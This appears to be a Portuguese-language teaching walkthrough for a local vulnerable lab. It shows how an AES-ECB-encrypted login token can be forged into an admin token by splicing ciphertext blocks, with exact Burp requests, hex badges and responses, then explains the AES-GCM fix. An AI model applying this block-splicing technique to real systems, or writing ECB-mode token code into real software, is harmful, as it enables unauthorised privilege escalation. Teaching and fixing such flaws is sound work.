# Walkthrough — crypto-ecb-mode

A app é um login API: você faz `POST` de um e-mail e senha, ela te devolve um **crachá** (badge) cifrado — um token que carrega quem você é e o seu role — e todo request protegido decifra esse crachá pra decidir o que servir. A autorização está correta: ela lê o role e gateia nele. O problema é o *modo* com que o crachá é cifrado: AES-ECB. Uma block cipher cifra em blocos fixos de 16 bytes; o ECB cifra cada bloco por conta própria, com a mesma chave. Então blocos de plaintext idênticos viram blocos de ciphertext idênticos e — porque os blocos são independentes — você pode recortar e rearranjar blocos de crachás legítimos pra montar um que decifra em `role=admin`, sem nunca conhecer a chave.

A trilha é **Burp Suite (Repeater + Decoder)**, do começo ao fim. Você lê um crachá de uma resposta de login, rearranja os blocos de ciphertext à mão, e reenvia; a prova é a resposta HTTP. Nada é quebrado — a chave nunca é tocada — então não há ferramenta offline, e não há browser.

## 1. Contexto

Um pequeno login API em `127.0.0.1:8032` (vulnerable) e `127.0.0.1:8132` (fixed):

- `GET /` — um banner JSON. Não é o alvo.
- `POST /login` — JSON `{"email", "password"}`. Monta o plaintext `email=<email>&role=user`, cifra, e devolve `{"badge": "<hex>"}`. O role é **sempre** `user` — o servidor nunca emite um crachá admin. Você tem que forjar.
- `GET /me` — lê o crachá do `Authorization: Bearer <hex>`, decifra, faz o parse de `email=...&role=...`, e responde por role: `user` recebe o próprio perfil, `admin` recebe uma área privilegiada.

Este átomo é **A02 — Cryptographic Failures**: o modo escolhido pra proteger o token em trânsito é o errado.

Termos, definidos uma vez:

- **Block cipher / bloco de 16 bytes.** AES é uma *block cipher* (cifra de bloco): ela cifra pedaços de tamanho fixo — **16 bytes** cada. Uma mensagem maior que 16 bytes precisa de uma regra pra encadear os blocos.
- **Mode of operation (modo de operação).** Essa regra. O **ECB (Electronic Codebook)** é o ingênuo: cada bloco de 16 bytes é cifrado *independentemente*, com a mesma chave, sem relação com os vizinhos.
- **Determinístico, bloco a bloco.** Sob ECB, os *mesmos* 16 bytes de plaintext sempre produzem o *mesmo* bloco de ciphertext — então a estrutura do plaintext transparece no ciphertext (o clássico "ECB penguin": cifre a imagem de um pinguim em ECB e você ainda vê o pinguim — veja o primer).
- **Cut-and-paste / block-splicing.** Como os blocos são independentes, você pode reordenar, remover ou colar blocos de ciphertext de tokens diferentes; cada um ainda decifra pro mesmo plaintext, onde quer que caia.
- **PKCS#7 padding.** O plaintext raramente é múltiplo exato de 16 bytes, então a cifra preenche o fim; o esquema padrão, **PKCS#7**, faz os *N* bytes finais valerem todos *N*. Esse detalhe é load-bearing pro splice abaixo.
- **Modo autenticado / AEAD.** Um modo que também prova que o ciphertext não foi alterado. O **GCM (Galois/Counter Mode)** é um: ele anexa uma **tag** de autenticação que liga o ciphertext, e usa um **nonce** (number used once) único por mensagem, então o mesmo plaintext cifra diferente toda vez. É o fix aqui.

O crachá é **hex-encoded**, então um bloco de 16 bytes tem exatamente **32 hex chars** — as fronteiras de bloco caem no caractere, o que te deixa recombinar à mão no Repeater. O exploit inteiro é Burp; a chave nunca entra.

## 2. Ver o padrão vazando (o tell)

Antes de forjar qualquer coisa, prove a propriedade central: plaintext idêntico → ciphertext idêntico. Mande um login cujo e-mail é um padrão repetido. `email=` são 6 bytes, então 10 caracteres de filler completam o primeiro bloco; depois 32 caracteres idênticos são dois blocos inteiros do mesmo conteúdo:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8032
Content-Type: application/json

{"email": "AAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", "password": "x"}
```

Resposta:

```json
{"badge":"1746f6b5415b93574b06b055fe3b500c2c37d6789f403283b3f8bd6e9ca8221e2c37d6789f403283b3f8bd6e9ca8221e3215aba376ac0f41aafea45af8daa6df"}
```

Divida em blocos de 32 hex chars (16 bytes) e alinhe:

```
block 0: 1746f6b5415b93574b06b055fe3b500c   email=AAAAAAAAAA
block 1: 2c37d6789f403283b3f8bd6e9ca8221e   BBBBBBBBBBBBBBBB
block 2: 2c37d6789f403283b3f8bd6e9ca8221e   BBBBBBBBBBBBBBBB   <-- idêntico ao block 1
block 3: 3215aba376ac0f41aafea45af8daa6df   &role=user + padding
```

Os blocos 1 e 2 são byte a byte idênticos — as duas sequências de `B` cifraram no mesmo ciphertext. É o ECB penguin em miniatura, ali na resposta HTTP. Isso te diz duas coisas: a cifragem é determinística bloco-a-bloco, e blocos são valores auto-contidos que você reconhece e move.

Rode exatamente o mesmo request contra a API fixed em `127.0.0.1:8132` e o crachá é mais longo e **não** tem repetições:

```
block 0: 5494c9cb09db5d27f285510ed6079af9
block 1: e3c94fa6cfdaf384d5adf3af7deba394
block 2: 84ef81083aad33905a769f62a1108be2
...
```

Mande duas vezes e você recebe dois crachás *diferentes*. É o nonce por mensagem do GCM — o mesmo plaintext cifra diferente toda vez, então não há padrão pra ler nem bloco pra reusar. Guarde isso pra seção 6.

## 3. Achar o bug

Abra o [`vulnerable/app.py`](./vulnerable/app.py). Cifragem e decifragem:

```python
def issue_badge(email, role):
    plaintext = f"email={email}&role={role}".encode()
    cipher = AES.new(KEY, AES.MODE_ECB)
    return cipher.encrypt(pad(plaintext, AES.block_size)).hex()

def read_badge(token):
    cipher = AES.new(KEY, AES.MODE_ECB)
    plaintext = unpad(cipher.decrypt(bytes.fromhex(token)), AES.block_size)
    return dict(kv.split("=", 1) for kv in plaintext.decode().split("&"))
```

A autorização ao redor disso está *correta* — o `GET /me` decifra, lê o `role`, e só destrava a área admin quando o role é `admin`. Não há check ausente nem injection. O bug é o **modo**: `AES.MODE_ECB`. A pergunta de auditoria não é "ele checa o role?" — checa. É "ECB é o modo certo pra cifrar um token de autoridade?" — e não é: determinístico (vaza o padrão), blocos independentes (blocos podem ser rearranjados) e não-autenticado (adulteração não é detectada). O fix é um modo autenticado.

## 4. Exploração — forjar um crachá admin recombinando blocos

O layout do plaintext é `email=<email>&role=<role>`, com o valor do role por último. Você controla o e-mail, então controla como os bytes caem nos blocos de 16 bytes. O plano: fazer a app cifrar um bloco `admin` pra você, e depois colar esse bloco onde o bloco `user` fica num crachá normal.

### 4.1 Baseline legítimo

Um login normal e o que o crachá destrava:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8032
Content-Type: application/json

{"email": "alice@lab.test", "password": "x"}
```

```
GET /me HTTP/1.1
Host: 127.0.0.1:8032
Authorization: Bearer <crachá da resposta>
```

Resposta — um user comum:

```json
{"email":"alice@lab.test","role":"user"}
```

### 4.2 Fazer a app cifrar um bloco `admin`

Você quer um bloco que seja exatamente `admin` seguido de PKCS#7 padding válido, pra que, quando ele virar o bloco *final* de um crachá forjado, o `unpad` o aceite e sobre exatamente `admin`. `admin` são 5 bytes; um bloco cheio de 16 bytes precisa de mais 11, e o PKCS#7 padding válido pra isso são 11 bytes de valor `0x0b`. Então você monta um e-mail que (a) preenche o primeiro bloco com `email=` + 10 caracteres, e depois (b) coloca `admin` + onze bytes `0x0b` como o próximo bloco inteiro:

```
email = AAAAAAAAAA admin <0x0b x 11>            (o valor que você manda)

plaintext:  email=AAAAAAAAAA | admin<0x0b x 11> | &role=user<pad>
            |--- block 0 ---| |--- block 1 ---| |--- block 2 --->
```

Em JSON os bytes `0x0b` são escritos como o escape `\u000b`. Mande:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8032
Content-Type: application/json

{"email": "AAAAAAAAAAadmin\u000b\u000b\u000b\u000b\u000b\u000b\u000b\u000b\u000b\u000b\u000b", "password": "x"}
```

Resposta:

```json
{"badge":"1746f6b5415b93574b06b055fe3b500cc17ec934eb6c794d844d7a2003d1b46c3215aba376ac0f41aafea45af8daa6df"}
```

Divida em blocos:

```
block 0: 1746f6b5415b93574b06b055fe3b500c   email=AAAAAAAAAA
block 1: c17ec934eb6c794d844d7a2003d1b46c   admin<0x0b x 11>   <-- o bloco que você quer
block 2: 3215aba376ac0f41aafea45af8daa6df   &role=user + padding
```

O block 1 — os hex chars 33–64 do crachá — é `E(admin + 0x0b x 11)`. Copie:

```
c17ec934eb6c794d844d7a2003d1b46c
```

### 4.3 Um crachá vítima com o valor do role sozinho num bloco

Agora alinhe um crachá pra que o *valor* do role comece um bloco novo, deixando o último bloco exatamente `user` + padding — substituível num movimento só. O prefixo `email=<email>&role=` tem que ser um número inteiro de blocos: `email=` (6) + `&role=` (6) são 12, então um e-mail de 4 caracteres fecha em 16.

```
email = AAAA

plaintext:  email=AAAA&role= | user<0x0c x 12>
            |--- block 0 ---| |--- block 1 -->
```

```
POST /login HTTP/1.1
Host: 127.0.0.1:8032
Content-Type: application/json

{"email": "AAAA", "password": "x"}
```

Resposta:

```json
{"badge":"fdbb349e1bf2e4defb99cda6ec6767fa489d221bc6eff5a78458caa13d992b11"}
```

```
block 0: fdbb349e1bf2e4defb99cda6ec6767fa   email=AAAA&role=
block 1: 489d221bc6eff5a78458caa13d992b11   user + padding
```

### 4.4 Recombinar e gastar

Substitua o block 1 do crachá vítima (o bloco `user`) pelo bloco `admin` do passo 4.2 — mantenha o block 0, troque os últimos 32 hex chars:

```
vítima:  fdbb349e1bf2e4defb99cda6ec6767fa 489d221bc6eff5a78458caa13d992b11
forjado: fdbb349e1bf2e4defb99cda6ec6767fa c17ec934eb6c794d844d7a2003d1b46c
                                           ^^^^ bloco admin colado ^^^^
```

Decifrado, isso é `email=AAAA&role=admin` seguido de onze bytes `0x0b`; o `unpad` remove os onze bytes de padding e sobra `email=AAAA&role=admin`. Gaste:

```
GET /me HTTP/1.1
Host: 127.0.0.1:8032
Authorization: Bearer fdbb349e1bf2e4defb99cda6ec6767fac17ec934eb6c794d844d7a2003d1b46c
```

Resposta — `200`:

```json
{"admin_area":"internal admin dashboard (dummy lab content)","email":"AAAA","role":"admin"}
```

Privilégio escalado. Você nunca soube a chave, não decifrou nada, e não quebrou cifra nenhuma — você pegou dois blocos de ciphertext que a app te entregou e os reordenou como Lego. O ECB decifrou cada bloco por conta própria e montou um plaintext que o servidor nunca autorizou.

> Isto é um lab local: as duas apps bindam em `127.0.0.1`, a chave e os dados são dummy (`atomicvulns-lab!` é uma chave obviamente falsa, os e-mails são descartáveis), e cada passo rodou no Burp contra os seus próprios containers. Nada sai da máquina, e nada é destrutivo.

## 5. O que a vuln NÃO é

Quatro conclusões erradas pra matar.

**Não é que "a chave é fraca ou vazou".** A chave nunca é quebrada, adivinhada, ou usada pelo atacante — o splice inteiro funciona sem ela. A prova é categórica: o lado fixed usa a **mesma** chave e o crachá forjado é rejeitado (próxima seção). Mesma chave, resultado diferente — a diferença é o modo.

**Não é que "AES é inseguro".** O AES está ok. A falha é o *modo*. O lado fixed é o mesmo AES com a mesma chave, em GCM, e o ataque morre.

**Não é injection.** Você não injetou código nem quebrou um parser — você rearranjou blocos *cifrados* válidos que a própria app produziu. Nenhum input virou código.

**Não é o problema do `crypto-weak-hash`.** Lá, um *hash* mão-única de senha é **recuperado** por pré-computação (uma rainbow table). Aqui, uma *cifra* reversível é **forjada** rearranjando blocos — nada é recuperado e nada é crackeado. Mesma categoria (A02), mecanismo oposto.

## 6. Impacto

Forja de token levando a escalada de privilégio. Você cunha um crachá que decifra em `role=admin` — sem credencial de admin e sem a chave — e o servidor te trata como administrador. **Não é RCE** (nenhum código roda) e **não é** recuperação de chave (a chave nunca é obtida); o teto é o que o role forjado destrava. Pra um token de autoridade, é esse o ponto: a fronteira que a cifragem devia impor agora é sua pra reescrever.

## 7. Por que o fix funciona

Rode o mesmo ataque contra a API fixed na porta **8132** (veja o [`DIFF.md`](./DIFF.md)). Ela cifra o crachá com **AES-GCM**. Pegue o crachá forjado da seção 4 e gaste ele lá:

```
GET /me HTTP/1.1
Host: 127.0.0.1:8132
Authorization: Bearer fdbb349e1bf2e4defb99cda6ec6767fac17ec934eb6c794d844d7a2003d1b46c
```

Resposta — `400`:

```json
{"error":"invalid badge"}
```

O GCM anexa uma **tag** de autenticação sobre o ciphertext inteiro. Rearranjar blocos faz a tag não bater mais, então o `decrypt_and_verify` levanta exceção e o servidor rejeita o crachá **antes de o role ser lido**. E lembre da seção 2: sob GCM o tell também some — o **nonce** por mensagem faz o plaintext idêntico cifrar diferente toda vez, então não há padrão pra ler nem bloco que valha a pena levar.

A prova de isolamento: logue normalmente e chame `GET /me` com o crachá **íntegro** nas **duas** portas — você recebe um `200 {"...","role":"user"}` idêntico. Só o crachá *adulterado* separa os lados (admin na 8032, rejeitado na 8132), e essa diferença traça puro ao modo.

O fix é uma coisa: trocar o modo por um autenticado. Não "trocar por CBC" — isso pararia o padrão vazando e o cut-and-paste limpo, uma melhora real, mas deixa o crachá não-autenticado e ainda adulterável por outros meios; sair do ECB é necessário, não suficiente. Não "trocar a chave", não "botar mais AES". Um modo autenticado (GCM) — veja o [`DIFF.md`](./DIFF.md) pro diff e por que os meio-fixes não se sustentam.
